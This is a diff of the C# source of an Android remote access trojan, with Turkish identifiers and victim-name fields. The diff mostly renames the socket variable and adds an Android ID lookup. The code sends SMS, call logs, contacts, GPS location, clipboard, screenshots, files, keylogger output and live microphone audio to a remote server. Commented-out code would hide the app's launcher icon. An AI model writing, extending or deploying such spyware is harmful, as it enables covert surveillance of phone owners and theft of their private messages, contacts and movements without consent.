@@ -142,9 +142,9 @@ namespace Task2
 
                 byte[] veri = System.Text.Encoding.UTF8.GetBytes(dosyalarS);
                 byte[] uzunluk = System.Text.Encoding.UTF8.GetBytes("FILES|IKISIDE|#" + veri.Length.ToString() + "#|");
-                PictureCallback.Send(Soketimiz, uzunluk, 0,
+                PictureCallback.Send(server, uzunluk, 0,
                    uzunluk.Length, 59999);
-                PictureCallback.Send(Soketimiz, veri, 0,
+                PictureCallback.Send(server, veri, 0,
                     veri.Length, 59999);
             }
             catch (Exception) { }
@@ -275,7 +275,7 @@ namespace Task2
                 catch (Exception) { }
             }
             byte[] gidecekler = System.Text.Encoding.UTF8.GetBytes("APPS|" + bilgiler + "|");
-            PictureCallback.Send(Soketimiz, gidecekler, 0, gidecekler.Length, 59999);
+            PictureCallback.Send(server, gidecekler, 0, gidecekler.Length, 59999);
         }
         public static string GetFileSizeInBytes(string filenane)
         {
@@ -316,6 +316,7 @@ namespace Task2
                     break;
             }
             client = new UdpClient();
+            //Toast.MakeText(this, "BAŞLADI", ToastLength.Long).Show();
             audioStream = new AudioStream(int.Parse(sampleRate), source);
             audioStream.OnBroadcast += AudioStream_OnBroadcast;
             audioStream.Start();
@@ -337,6 +338,7 @@ namespace Task2
         }
         private void AudioStream_OnBroadcast(object sender, byte[] e)
         {
+            //Toast.MakeText(this, "onbrod " + e.Length.ToString(), ToastLength.Long).Show();
             try
             {
                 client.Send(e, e.Length, new IPEndPoint(Dns.GetHostAddresses(MainValues.IP)[0], MainValues.port));
@@ -344,6 +346,7 @@ namespace Task2
             }
             catch (SocketException)
             {
+                //Toast.MakeText(this, "mic " + ex.Message, ToastLength.Long).Show();
                 micStop();
             }
         }
@@ -397,17 +400,17 @@ namespace Task2
             {
                 Directory.CreateDirectory(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
             }
-            StartForegroundServiceCompat<ForegroundService>(this);
-
-            /*
-             * This code is buggy. If we include this code into the our app, our app stops the work.
-         PackageManager p = PackageManager;
-         ComponentName componentName = new ComponentName(ApplicationContext, Class);
-         p.SetComponentEnabledSetting(componentName,
-         ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
-         */
+            //hide();
+            StartForegroundServiceCompat<ForegroundService>(this,savedInstanceState);           
         }
-
+        /*
+        public void hide()
+        {
+            //FUCK! this code causes bug...
+            ComponentName componentName = new ComponentName(this, Java.Lang.Class.FromType(typeof(MainActivity)).Name);
+            PackageManager.SetComponentEnabledSetting(componentName, ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
+        }
+        */
         public async void otogizlen()
         {
             await Task.Delay(10000);
@@ -607,7 +610,7 @@ namespace Task2
                 {
                     Capture = PictureCallback.Compress(Capture);
                     byte[] gidecek = System.Text.Encoding.UTF8.GetBytes("SCREENSHOT|" + Capture.Length.ToString());
-                    PictureCallback.Send(Soketimiz, gidecek, 0, gidecek.Length, 5999);
+                    PictureCallback.Send(server, gidecek, 0, gidecek.Length, 5999);
                     NetworkStream ns = new NetworkStream(Soketimiz);
                     BinaryWriter binaryWriter = new BinaryWriter(ns);
                     lock (this)
@@ -710,7 +713,7 @@ namespace Task2
                     byte[] ayrintilar = System.Text.Encoding.UTF8.GetBytes("LOCATION|" + GeoCountryName + "=" + admin +
                            "=" + sub2 + "=" + sublocal + "=" + local + "=" + location.Latitude.ToString() +
                          "{" + location.Longitude + "=");
-                    PictureCallback.Send(Soketimiz, ayrintilar, 0, ayrintilar.Length, 59999);
+                    PictureCallback.Send(server, ayrintilar, 0, ayrintilar.Length, 59999);
                 }
             }
             catch (FeatureNotSupportedException ex)
@@ -718,28 +721,28 @@ namespace Task2
                 byte[] ayrintilar = System.Text.Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                                "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                             "=" + "HATA" + "=" + "HATA" + "=");
-                PictureCallback.Send(Soketimiz, ayrintilar, 0, ayrintilar.Length, 59999);
+                PictureCallback.Send(server, ayrintilar, 0, ayrintilar.Length, 59999);
             }
             catch (FeatureNotEnabledException ex)
             {
                 byte[] ayrintilar = System.Text.Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                                    "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                                 "=" + "HATA" + "=" + "HATA" + "=");
-                PictureCallback.Send(Soketimiz, ayrintilar, 0, ayrintilar.Length, 59999);
+                PictureCallback.Send(server, ayrintilar, 0, ayrintilar.Length, 59999);
             }
             catch (PermissionException ex)
             {
                 byte[] ayrintilar = System.Text.Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                                    "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                                 "=" + "HATA" + "=" + "HATA" + "=");
-                PictureCallback.Send(Soketimiz, ayrintilar, 0, ayrintilar.Length, 59999);
+                PictureCallback.Send(server, ayrintilar, 0, ayrintilar.Length, 59999);
             }
             catch (Exception ex)
             {
                 byte[] ayrintilar = System.Text.Encoding.UTF8.GetBytes("LOCATION|" + "HATA: " + ex.Message + "=" +
                                    "HATA" + "=" + "HATA" + "=" + "HATA" + "=" + "HATA" +
                                 "=" + "HATA" + "=" + "HATA" + "=");
-                PictureCallback.Send(Soketimiz, ayrintilar, 0, ayrintilar.Length, 59999);
+                PictureCallback.Send(server, ayrintilar, 0, ayrintilar.Length, 59999);
             }
         }
         public void Ac(string path)
@@ -802,8 +805,8 @@ namespace Task2
             if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "SMS YOK"; }
             byte[] gidecek_Veri = System.Text.Encoding.UTF8.GetBytes(gidecek_veriler);
             byte[] isim_bytlari = System.Text.Encoding.UTF8.GetBytes("SMSLOGU|#" + gidecek_Veri.Length.ToString() + "#|");
-            PictureCallback.Send(Soketimiz, isim_bytlari, 0, isim_bytlari.Length, 59999);
-            PictureCallback.Send(Soketimiz, gidecek_Veri, 0, gidecek_Veri.Length, 59999);
+            PictureCallback.Send(server, isim_bytlari, 0, isim_bytlari.Length, 59999);
+            PictureCallback.Send(server, gidecek_Veri, 0, gidecek_Veri.Length, 59999);
         }
         public void telefonLogu()
         {
@@ -821,8 +824,8 @@ namespace Task2
             if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "CAGRI YOK"; }
             byte[] gidecek_Veri = System.Text.Encoding.UTF8.GetBytes(gidecek_veriler);
             byte[] isim_bytlari = System.Text.Encoding.UTF8.GetBytes("CAGRIKAYITLARI|#" + gidecek_Veri.Length.ToString() + "#|");
-            PictureCallback.Send(Soketimiz, isim_bytlari, 0, isim_bytlari.Length, 59999);
-            PictureCallback.Send(Soketimiz, gidecek_Veri, 0, gidecek_Veri.Length, 59999);
+            PictureCallback.Send(server, isim_bytlari, 0, isim_bytlari.Length, 59999);
+            PictureCallback.Send(server, gidecek_Veri, 0, gidecek_Veri.Length, 59999);
         }
         public void rehberLogu()
         {
@@ -840,8 +843,8 @@ namespace Task2
             if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "REHBER YOK"; }
             byte[] gidecek_Veri = System.Text.Encoding.UTF8.GetBytes(gidecek_veriler);
             byte[] isim_bytlari = System.Text.Encoding.UTF8.GetBytes("REHBER|#" + gidecek_Veri.Length.ToString() + "#|");
-            PictureCallback.Send(Soketimiz, isim_bytlari, 0, isim_bytlari.Length, 59999);
-            PictureCallback.Send(Soketimiz, gidecek_Veri, 0, gidecek_Veri.Length, 59999);
+            PictureCallback.Send(server, isim_bytlari, 0, isim_bytlari.Length, 59999);
+            PictureCallback.Send(server, gidecek_Veri, 0, gidecek_Veri.Length, 59999);
         }
         public bool SetKioskMode(bool enable)
         {
@@ -972,7 +975,7 @@ namespace Task2
                 try
                 {
                     byte[] basarili = System.Text.Encoding.UTF8.GetBytes("INDIRILDI|Dosya başarılı bir şekilde indi.|");
-                    PictureCallback.Send(Soketimiz, basarili, 0, basarili.Length, 59999);
+                    PictureCallback.Send(server, basarili, 0, basarili.Length, 59999);
                 }
                 catch (Exception) { }
             }
@@ -981,7 +984,7 @@ namespace Task2
                 try
                 {
                     byte[] hata = System.Text.Encoding.UTF8.GetBytes("INDIRILDI|" + ex.Message + "|");
-                    PictureCallback.Send(Soketimiz, hata, 0, hata.Length, 59999);
+                    PictureCallback.Send(server, hata, 0, hata.Length, 59999);
                 }
                 catch (Exception) { }
             }
@@ -1020,7 +1023,7 @@ namespace Task2
                                     javaFileWrite(alinan_dosya_byte, ayirici[3] + "/" + ayirici[2]);
                                 }
                                 byte[] alindi = System.Text.Encoding.UTF8.GetBytes("DOSYAALINDI|" + MainValues.KRBN_ISMI);
-                                PictureCallback.Send(Soketimiz, alindi, 0,
+                                PictureCallback.Send(server, alindi, 0,
                                 alindi.Length, 59999);
                             }
                             catch (Exception) { }
@@ -1075,11 +1078,11 @@ namespace Task2
                         case "INDIR":
                             try
                             {
-                                byte[] bite = System.Text.Encoding.UTF8.GetBytes("UZUNLUK|" + File.ReadAllBytes(ayirici[1]).Length.ToString() + "|" + ayirici[1].Substring(ayirici[1].LastIndexOf("/") + 1) + "|" + "[KURBAN_ADI]|");
+                                byte[] bite = System.Text.Encoding.UTF8.GetBytes("UZUNLUK|" + File.ReadAllBytes(ayirici[1]).Length.ToString() + "|" + ayirici[1].Substring(ayirici[1].LastIndexOf("/") + 1) + "|" + MainValues.KRBN_ISMI +"_"+ GetIdentifier() + "|");
                                 byte[] dosya = File.ReadAllBytes(ayirici[1]);
-                                PictureCallback.Send(Soketimiz, bite, 0,
+                                PictureCallback.Send(server, bite, 0,
                                 bite.Length, 59999);
-                                PictureCallback.Send(Soketimiz, dosya, 0, dosya.Length, 59999);
+                                PictureCallback.Send(server, dosya, 0, dosya.Length, 59999);
                             }
                             catch (Exception) { }
                             break;
@@ -1112,21 +1115,21 @@ namespace Task2
                                 }
                                 byte[] files = System.Text.Encoding.UTF8.GetBytes(log_dosylari_gonder);
                                 byte[] gonder = System.Text.Encoding.UTF8.GetBytes("LOGDOSYA|#" + files.Length.ToString() + "#|");
-                                PictureCallback.Send(Soketimiz, gonder, 0, gonder.Length, 59999);
-                                PictureCallback.Send(Soketimiz, files, 0, files.Length, 59999);
+                                PictureCallback.Send(server, gonder, 0, gonder.Length, 59999);
+                                PictureCallback.Send(server, files, 0, files.Length, 59999);
                                 //Toast.MakeText(this, "gönderildi", ToastLength.Long).Show();
                             }
                             else
                             {
                                 byte[] gonder = System.Text.Encoding.UTF8.GetBytes("LOGDOSYA|LOG_YOK");
-                                PictureCallback.Send(Soketimiz, gonder, 0, gonder.Length, 59000);
+                                PictureCallback.Send(server, gonder, 0, gonder.Length, 59000);
                             }
                             break;
                         case "KEYCEK":
                             byte[] read = System.Text.Encoding.UTF8.GetBytes(File.ReadAllText(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly/" + ayirici[1]).Replace(System.Environment.NewLine, "[NEW_LINE]"));
                             byte[] log = System.Text.Encoding.UTF8.GetBytes("KEYGONDER|#" + read.Length.ToString() + "#|");
-                            PictureCallback.Send(Soketimiz, log, 0, log.Length, 59000);
-                            PictureCallback.Send(Soketimiz, read, 0, read.Length, 59999);
+                            PictureCallback.Send(server, log, 0, log.Length, 59000);
+                            PictureCallback.Send(server, read, 0, read.Length, 59999);
                             break;
                         case "DOSYAAC":
                             Ac(ayirici[1]);
@@ -1216,7 +1219,7 @@ namespace Task2
                                 int BPercetage = (int)Math.Floor(level * 100D / scale);
                                 var per = BPercetage.ToString();
                                 var lev = System.Text.Encoding.UTF8.GetBytes("TELEFONBILGI|" + per.ToString() + "|" + ekranDurumu() + "|" + usbDurumu());
-                                PictureCallback.Send(Soketimiz, lev, 0, lev.Length, 59999);
+                                PictureCallback.Send(server, lev, 0, lev.Length, 59999);
                             }
                             catch (Exception) { }
                             break;
@@ -1306,6 +1309,14 @@ namespace Task2
                 }
             });
         }
+        public string GetIdentifier()
+        {
+            try
+            {
+                return Settings.Secure.GetString(ContentResolver, Settings.Secure.AndroidId);
+            }
+            catch (Exception) { return "error_imei"; }
+        }
         /*
         const int sizeByte = 1024;
         public void ReciveFile(Socket Client, string path)
@@ -1366,12 +1377,12 @@ namespace Task2
                 dosyalarS += inf + System.Environment.NewLine;
             }
             //byte[] veri = System.Text.Encoding.UTF8.GetBytes("FILES|" + dosyalarS + "|CIHAZ|");
-            //PictureCallback.Send(Soketimiz, veri, 0, veri.Length, 59999);
+            //PictureCallback.Send(server, veri, 0, veri.Length, 59999);
             byte[] veri = System.Text.Encoding.UTF8.GetBytes(dosyalarS);
             byte[] uzunluk = System.Text.Encoding.UTF8.GetBytes("FILES|CIHAZ|#" + veri.Length.ToString() + "#|");
-            PictureCallback.Send(Soketimiz, uzunluk, 0,
+            PictureCallback.Send(server, uzunluk, 0,
                uzunluk.Length, 59999);
-            PictureCallback.Send(Soketimiz, veri, 0,
+            PictureCallback.Send(server, veri, 0,
                 veri.Length, 59999);
 
         }
@@ -1383,12 +1394,12 @@ namespace Task2
                 dosyalarS += inf + System.Environment.NewLine;
             }
             //byte[] veri = System.Text.Encoding.UTF8.GetBytes("FILES|" + dosyalarS + "|SDCARD|");
-            //PictureCallback.Send(Soketimiz, veri, 0,veri.Length, 59999);
+            //PictureCallback.Send(server, veri, 0,veri.Length, 59999);
             byte[] veri = System.Text.Encoding.UTF8.GetBytes(dosyalarS);
             byte[] uzunluk = System.Text.Encoding.UTF8.GetBytes("FILES|SDCARD|#" + veri.Length.ToString() + "#|");
-            PictureCallback.Send(Soketimiz, uzunluk, 0,
+            PictureCallback.Send(server, uzunluk, 0,
                uzunluk.Length, 59999);
-            PictureCallback.Send(Soketimiz, veri, 0,
+            PictureCallback.Send(server, veri, 0,
                 veri.Length, 59999);
         }
         public string usbDurumu()
@@ -1452,8 +1463,8 @@ namespace Task2
             {
 
                 byte[] pala_uzunluk = System.Text.Encoding.UTF8.GetBytes("PANOGELDI|#" + pala.Length.ToString() + "#|");
-                PictureCallback.Send(Soketimiz, pala_uzunluk, 0, pala_uzunluk.Length, 59999);
-                PictureCallback.Send(Soketimiz, pala, 0, pala.Length, 59999);
+                PictureCallback.Send(server, pala_uzunluk, 0, pala_uzunluk.Length, 59999);
+                PictureCallback.Send(server, pala, 0, pala.Length, 59999);
             }
             catch (Exception) { }
         }
@@ -1519,8 +1530,8 @@ namespace Task2
                     bitmapData = ms.ToArray();
                 }
                 byte[] ziya = System.Text.Encoding.UTF8.GetBytes("WALLPAPERBYTES|" + bitmapData.Length.ToString() + "|");
-                PictureCallback.Send(Soketimiz, ziya, 0, ziya.Length, 59999);
-                PictureCallback.Send(Soketimiz, bitmapData, 0, bitmapData.Length, 59999);
+                PictureCallback.Send(server, ziya, 0, ziya.Length, 59999);
+                PictureCallback.Send(server, bitmapData, 0, bitmapData.Length, 59999);
                 //Toast.MakeText(this, "DUVAR KAĞIDI OKAY ", ToastLength.Long).Show();
             }
             catch (Exception)
@@ -1601,7 +1612,7 @@ namespace Task2
 
             string gonderilecekler = ZIL_SESI + "=" + MEDYA_SESI + "=" + BILDIRIM_SESI + "=";
             byte[] git_Artik_bezdim = System.Text.Encoding.UTF8.GetBytes("SESBILGILERI|" + gonderilecekler);
-            PictureCallback.Send(Soketimiz, git_Artik_bezdim, 0, git_Artik_bezdim.Length, 59999);
+            PictureCallback.Send(server, git_Artik_bezdim, 0, git_Artik_bezdim.Length, 59999);
         }
         public static Activity global_activity = default;
         public static PackageManager global_packageManager = default;
